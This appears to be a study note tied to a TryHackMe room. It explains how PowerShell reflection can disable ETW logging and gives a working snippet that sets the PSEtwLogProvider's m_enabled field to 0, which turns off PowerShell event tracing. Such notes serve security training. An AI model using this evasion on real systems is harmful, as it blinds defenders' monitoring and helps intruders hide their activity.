# ETW-Evasion PowerShell Reflection

Powershell Reflection is a [[Logging-And-Monitoring-Evasion]] technique. Within PowerShell, [[Event-Tracing-for-Windows]] (ETW) providers are loaded into the session from a .NET assembly: `PSEtwLogProvider`, most .NET assemblies are loaded in the same security context as the user at startup. [Microsoft documentation](https://docs.microsoft.com/en-us/dotnet/standard/assembly/), *"Assemblies form the fundamental units of deployment, version control, reuse, activation scoping, and security permissions for .NET-based applications."*

Reflection is as [O'Reilly](https://www.oreilly.com/library/view/professional-windows-powershell/9780471946939/9780471946939_using_.net_reflection.html): *"Reflection allows you to look inside an assembly and find out its characteristics. Inside a .NET assembly, information is stored that describes what the assembly contains. This is called metadata. A .NET assembly is, in a sense, self-describing, at least if interrogated correctly.*

By modifying the assembly fields and values through PowerShell Reflection we can reflect an ETW event provider assembly and set field `m_enabled` to `$null`.

```powershell
# Obtain .NET assembly for `PSEtwLogProvider`
$logProvider = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
# Store a null value for `etwProvider` field
$etwProvider = $logProvider.GetField('etwProvider','NonPublic,Static').GetValue($null)
# Set the field `m_enabled` to a previously stored value
[System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue($etwProvider,0);
```
Â 

## References

[THM Evading Logging and Monitoring Room](https://tryhackme.com/room/monitoringevasion)
[Microsoft documentation](https://docs.microsoft.com/en-us/dotnet/standard/assembly/)